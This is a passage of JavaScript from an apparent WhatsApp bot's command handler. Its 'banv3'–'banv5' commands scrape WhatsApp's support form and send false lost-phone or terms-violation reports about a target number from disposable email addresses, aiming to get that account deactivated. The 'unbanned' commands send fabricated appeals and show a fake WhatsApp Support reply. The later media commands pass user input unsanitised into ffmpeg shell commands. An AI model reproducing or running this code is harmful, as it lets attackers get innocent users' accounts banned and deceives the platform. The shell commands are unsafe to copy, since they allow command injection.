form.append("phone_number", koisplit)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Porfavor, desative o número da minha conta, o chip e os documentos foram roubados essa conta possuí dados importante, então, por favor desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv3': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let koisplit = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let koiuy = await qyuunee.onWhatsApp(koisplit)
if (koiuy.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let koiax = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = koiax.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(koiax.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", koisplit)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/Roubado: Por favor, desative minha conta\n\nOlá, por favor desative este número, pois perdi meu celular e alguém está usando meu número, por favor desative meu número")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv4': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
let koisplit = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let koiuy = await qyuunee.onWhatsApp(koisplit)
if (koiuy.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let koiax = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = koiax.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(koiax.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", koisplit)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "UM DE SEUS USUÁRIOS, ESTA USANDO O APK DO WHATSAPP FEITO POR TERCEIROS E ESTA INDO CONTRA OS TERMOS DE SERVIÇO PEÇO QUE ANALISEM ESSE USUÁRIO")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break
case 'banv5': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 916969696969`)
koisplit = `+`+q.split("|")[0].replace(/[^0-9]/g, '')
let koiuy = await qyuunee.onWhatsApp(koisplit)
if (koiuy.length == 0) return reply(`Enter a valid and registered number on WhatsApp!!!`)
let axioss = require("axios")  
let koiax = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = koiax.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(koiax.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDIA")
form.append("phone_number", koisplit)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "مرحبًا ، يرجى إلغاء تنشيط هذا الرقم ، لأنني فقدت هاتفي وشخص ما يستخدم رقمي ، يرجى إلغاء تنشيط رقمي")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
qyuunee.sendMessage(from, { text: util.format(res.data)}, { quoted: m })
}
break

case 'unbanned': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aku Tidak Tau Mengapa Nomor Saya Tiba Tiba Di Larang Dari Menggunakan WhatsApp Aku Hanya Membalas Pesan Customer Saya Mohon Buka Larangan Akun WhatsApp Saya: [+${targetnya}]
Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp :3`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'unbannedv2': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Pihak WhatsApp yang terhormat mohon bantuan anda segera
[${targetnya}]
Saya telah mengirim beberapa email dan laporan ke pihak WhatsApp untuk mengajukan banding agar nomor saya cepat di buka dari daftar blokir, saya sangat membutuhkan untuk keperluan pribadi berkomunikasi dengan keluarga jika saya melakukan pelanggaran sebelumnya maka saya akan menggunakan nomor saya tersebut dengan lebih hati-hati dan lebih baik lagi dari sebelumnya dan saya sekarang telah menuruti apa yang pihak WhatsApp sarankan, dan saya sangat berharap sekarang juga nomor saya dapat di gunakan kembali. Terimakasih`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp :3`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'unbannedv3': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Hola WhatsApp
Actualmente, algunas personas tienen muchas formas efectivas de bloquear números de usuario e informarlos sin ningún motivo, de hecho, conozco bien los términos de servicio y los cumplí, pero algunos piratas informáticos me hicieron un informe falso y mi número fue bloqueado, desbloquee el número ${targetnya}`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp :3`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'unbannedv4': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Good day whatsApp team. My whatApp account has been burned permanently, please i plead with you unblock it, i cannot use another number again. I don’t know why it is burned but my friends re suggesting its because i use GB whatsApp, which i didn’t know it was wrong. My number is [ ${targetnya} ]. Please whatsApp team, help me unblock my account. please i cannot use a new number as my current number is connected to slot of important things like vacancies.
Thank you`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp :3`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'unbannedv5': {
if (!isCreator) return
if (m.quoted || q) {
var tosend = m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (tosend === global.owner) return reply(`Tidak bisa verif My Creator!`)
var targetnya = tosend.split('@')[0]

try {
var axioss = require('axios')
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "+")
form.append("phone_number", `+${targetnya}`,)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", `Aloha WhatsApp, ua ʻaihue ʻia kaʻu helu e ka mea hacker, e ʻoluʻolu e wehe hou iā ia [${targetnya}]`)
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19572.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1007965968")
form.append("__comment_req", "0")

let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}

})
reply(`Wait 1-24 Jam an untuk proses unbanned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp :3`)
await loading(90000)
let payload = String(res.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##

Halo,

Terima kasih telah menghubungi kami.

Sistem kami menandai aktivitas akun Anda sebagai pelanggaran terhadap Ketentuan Layanan kami dan memblokir nomor telepon Anda. Kami sangat menghargai Anda sebagai pengguna. Mohon maaf atas kebingungan atau ketidaknyamanan yang disebabkan oleh masalah ini.

Kami telah menghapus pemblokiran setelah meninjau aktivitas akun Anda. Sekarang seharusnya Anda sudah memiliki akses ke WhatsApp.

Sebagai langkah selanjutnya, kami sarankan untuk mendaftarkan ulang nomor telepon Anda di WhatsApp untuk memastikan Anda memiliki akses. Anda dapat mengunjungi situs web kami untuk

mengunduh WhatsApp atau aplikasi WhatsApp Business.`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##

Terima kasih telah menghubungi kami. Kami akan menghubungi Anda kembali melalui email, dan itu mungkin memerlukan waktu hingga tiga hari kerja.`)
} else reply(util.format(res.data))
} catch (err) {reply(`${err}`)}
} else reply('Masukkan nomor target!')
}
break

case 'limit':{
reply('🕊️ *Your Limit:* ' + (db.data.users[m.sender].limit))
}
break

case 'level':{
const { canLevelUp, xpRange } = require('./lib/levelling')
let user = global.db.data.users[m.sender]
if (!canLevelUp(user.level, user.exp, global.multiplier)) {
let { min, xp, max } = xpRange(user.level, global.multiplier)
let txt = `💀 Level: *${user.level} (${user.exp - min}/${xp})*\n🐦 Kurang *${max - user.exp}* Lagi!`
await qyuunee.sendMessage(m.chat, { text: txt }, { quoted : m })}
}
break

case 'leaderboard': {
let users = Object.entries(global.db.data.users).map(([key, value]) => {
    return {...value, jid: key}
  })
  let sortedLevel = users.map(toNumber('level')).sort(sort('level'))
  let usersLevel = sortedLevel.map(enumGetKey)
  let len = args[0] && args[0].length > 0 ? Math.min(10, Math.max(parseInt(args[0]), 10)) : Math.min(10, sortedLevel.length)
  let text = `• *Level Leaderboard Top ${len}* •
Kamu: *${usersLevel.indexOf(m.sender) + 1}* dari *${usersLevel.length}*

${sortedLevel.slice(0, len).map(({ jid, level }, i) => `${i + 1}. ${participants.some(p => jid === p.jid) ? `(${qyuunee.getName(jid)}) wa.me/` : '@'}${jid.split`@`[0]} *Level ${level}*`).join`\n`}`.trim()
reply(text)
}
break

case 'resetafk': {
if (!isCreator) return reply(mess.owner)
    Object.values(global.db.users).forEach(user => {
        if (user.afkTime && user.afkTime !== -1) {
            user.afkTime = -1;
            user.afkReason = '';
        }
    });
    m.reply('Semua Pengguna Telah Dibatalkan Dari Kondisi AFK Secara Paksa!');
}
break
		
case 'resetlimit': {
if (!isCreator) return reply(mess.owner)
let list = Object.entries(global.db.data.users)
	let lim = !args || !args[0] ? 100 : isNumber(args[0]) ? parseInt(args[0]) : 100
	lim = Math.max(1, lim)
	list.map(([user, data], i) => (Number(data.limit = lim)))
		qyuunee.sendMessage(m.chat, {text: `*🕊️ Limit berhasil direset ${lim} / user*`}, { quoted: koi })
		}
break

case 'addlimit': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply('Masukkan Jumlah Limit Yang Akan Diberi')
    let who
    if (m.isGroup) who = m.mentionedJid[0]
    else who = m.chat
    if (!who) throw 'Tag Orangnya'
    let txt = text.replace('@' + who.split`@`[0], '').trim()
    if (isNaN(txt)) throw 'Hanya Angka'
    let poin = parseInt(txt)
    let limit = poin
    if (limit < 1) throw 'Minimal 1'
    let user = global.db.data.users
    user[who].limit += poin
    if (limit > 9999999) return reply('Jangan Banyak² Jir 😂') 
    qyuunee.sendMessage(m.chat, {text: `Selamat @${who.split`@`[0]}. Kamu Mendapatkan +${poin} Limit!`}, {quoted:m})
    }
break

case 'hd':
case 'remini':
case 'hdfree': {
if (!/image/.test(mime)) return reply(`Kirim/Reply Image/Gambar Yang Ingin Di Enchance !!`)
/*if (global.db.data.users[m.sender].limit < 1) return reply('🚩 Limit Habis...') // respon ketika limit habis
                db.data.users[m.sender].limit -= 10
reply('🚩 10 Limit Dipakai...')*/
loading()
const meks = await quoted.download()
const proses = await remini(meks, "enhance");
qyuunee.sendMessage(m.chat, {image: proses, mimetype: 'image/png'}, {quoted:m})
}
break

case 'hdvideo': {
if (!isPremium) return reply(mess.prem)
/*if (global.db.data.users[m.sender].limit < 1) return reply('🚩 Limit Habis...') // respon ketika limit habis
                db.data.users[m.sender].limit -= 10
reply('🚩 10 Limit Dipakai...')*/
loading()
let media = await quoted.download()
qyuunee.sendMessage(m.chat, { video: media}, {quoted:m})
}
break

case 'hdvid': {
if (!isPremium) return reply(mess.prem)
  const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? qyuunee.user.jid : m.sender;
  const q = m.quoted ? m.quoted : m;
  const mime = (q.msg || q).mimetype || '';
  if (!mime) return m.reply(`Vidio nya mana?`);
  m.reply("wait..");
  let { UploadFileUgu } = require('./lib/uploader')
  const media = await quoted.download()
  /*const url = await UploadFileUgu(media);*/
  const output = 'output.mp4'; 
  
  exec(`ffmpeg -i ${media} -vf "hqdn3d=1.5:1.5:6:6,nlmeans=p=7:s=7,vaguedenoiser=threshold=2.0:method=soft:nsteps=5,deband,atadenoise,unsharp=3:3:0.6,eq=brightness=0.05:contrast=1.2:saturation=1.1" -vcodec libx264 -profile:v main -level 4.1 -preset veryslow -crf 18 -x264-params ref=4 -acodec copy -movflags +faststart ${output}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error: ${error.message}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);

    qyuunee.sendMessage(m.chat, { caption: `_Success To Enhanced Video_`, video: { url: output }}, {quoted: m});
  });
  
            
}
break

case 'hdvid2': {
    if (!isPremium) return reply(mess.prem)
    const mime = (quoted.msg || quoted).mimetype || '';
    const qmsg = (quoted.msg || quoted);
    let fps = parseInt(text);
    
    if (!/video/.test(mime)) reply(`Send/Reply videos with the caption *${prefix}${command}* 60`);
    if ((m.quoted ? m.quoted.seconds : m.msg.seconds) > 30) reply(`Maksimal video 30 detik!`);
    if (!fps) reply(`Masukkan fps, contoh: *${prefix}${command}* 60`);
    if (fps > 60) reply(`Maksimal fps adalah 60 fps!`);
    await qyuunee.sendMessage(m.chat, { react: { text: '⏱️', key: m.key }});

    const chdir = "hd_video";
    const timestamp = Date.now();
    const pndir = `${chdir}/${m.sender}`;
    const rsdir = `${chdir}/result-${m.sender}`;
    const fdir = `${pndir}/frames/${timestamp}`;
    const rfdir = `${rsdir}/frames/${timestamp}`;
    const rname = `${rsdir}/${m.sender}-${timestamp}.mp4`;

    const dirs = [chdir, pndir, rsdir, `${pndir}/frames`, fdir, `${rsdir}/frames`, rfdir];
    dirs.forEach(dir => {
        if (!fs.existsSync(dir)) fs.mkdirSync(dir);
    });

    const media = await qyuunee.downloadAndSaveMediaMessage(qmsg, `${pndir}/${timestamp}`);

    await new Promise((resolve, reject) => {
        exec(`ffmpeg -i ${media} -vf "fps=${fps}" ${fdir}/frame-%04d.png`, (err) => {
            if (err) reject(err);
            else resolve();
        });
    });

    const images = fs.readdirSync(fdir);
    let result = {};

    for (let i = 0; i < images.length; i++) {
        const image = images[i];
        result[image] = remini(fs.readFileSync(`${fdir}/${image}`), "enhance");
    }

    const values = await Promise.all(Object.values(result));
    Object.keys(result).forEach((key, index) => {
        result[key] = values[index];
    });
    
    for(let i of Object.keys(result)) {
        fs.writeFileSync(`${rfdir}/${i}`, result[i]); 
    }

    await new Promise((resolve, reject) => {
        exec(`ffmpeg -framerate ${fps} -i ${rfdir}/frame-%04d.png -i ${media} -c:v libx264 -pix_fmt yuv420p -c:a aac -strict experimental -shortest ${rname}`, (err) => {
            if (err) reject(err);
            else resolve();
        });
    });
    qyuunee.sendMessage(m.chat, { video: fs.readFileSync(rname) }, { quoted: m });
    }
    break
    
case 'toanime': {
if (!isCreator) return reply(mess.owner)
loading()
const meks = await qyuunee.downloadAndSaveMediaMessage(quoted)
const oke = await uptotelegra(meks)
result = await getBuffer(`https://vihangayt.me/tools/toanime?url=${oke}`)
qyuunee.sendMessage(m.chat, {image: result, mimetype: 'image/png'}, {quoted:m})
}
break

case 'colorize': {
if (!isCreator) return reply(mess.owner)
if (!quoted) return reply(`Kirim/Reply Gambar Hitam Putih Dengan Caption ${prefix+command}`)
loading()
const meks = await qyuunee.downloadAndSaveMediaMessage(quoted)
const oke = await uptotelegra(meks)
result = await getBuffer(`https://vihangayt.me/tools/colorize?url=${oke}`)
qyuunee.sendMessage(m.chat, {image: result, mimetype: 'image/png'}, {quoted:m})
}
break

case 'ai':
case 'openai': {
                if (!full_args) return reply('Apa yang kamu ingin ketahui?')
                let gpt = await fetchJson(`https://widipe.com/gpt4?text=${full_args}`)
		await qyuunee.sendMessage(from, {
                    text: gpt.result
                }, { quoted: koi })
                /*
                let d = await aigpt(`${full_args}`)                
                qyuunee.sendMessage(from, {
                    text: d.evaled
                }, { quoted: m})
                */
            }
break

case 'imgtxt': {
if (!full_args) return reply(`${prefix + command} blue sea`)
let lastUsed = 0;
let currentTime = Date.now();
  if (currentTime - lastUsed < 10000) reply("Cooldown 10 detik coba lagi nanti");

  lastUsed = currentTime;

  try {
    let gpt = await (await fetch(`https://tti.photoleapapp.com/api/v1/generate?prompt=${full_args}`)).json();
    loading()
    qyuunee.sendMessage(m.chat, {image: { url: gpt.result_url}, caption: text}, {quoted: m});
  } catch(e) {
    reply("`*GPT Tidak Merespons*`")
  }
}
break

case 'realistic': {
let t = text.split('+');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} prompt+negativ-prompt`)
let lastUsed = 0;
let currentTime = Date.now();
  if (currentTime - lastUsed < 10000) reply("Cooldown 10 detik coba lagi nanti");

  lastUsed = currentTime;

  try {
    let res = await (await fetch(`https://itzpire.site/ai/realistic?prompt=${t[0]}&negative_prompt=${t[1]}`)).json();
    loading()
    qyuunee.sendMessage(m.chat, {image: { url: res.result}, caption: text}, {quoted: m});
  } catch(e) {
    reply("`*Realistic Tidak Merespons*`")
  }
}
break

case 'resize': {
if (args.length < 3) return reply(`*Format salah!*
Penggunaan:
${prefix + command} url width height`)
  try {
    let res = await (await fetch(`https://itzpire.site/tools/resize-img?url=${args[0]}&width=${args[1]}&height=${args[2]}`)).json();
    loading()
    qyuunee.sendMessage(m.chat, {image: { url: res.result}, caption: text}, {quoted: m});
  } catch(e) {
    reply("`*Resize Tidak Merespons*`")
  }
}
break

/*
case 'paimon': {
                if (!full_args) return reply('Halo...')
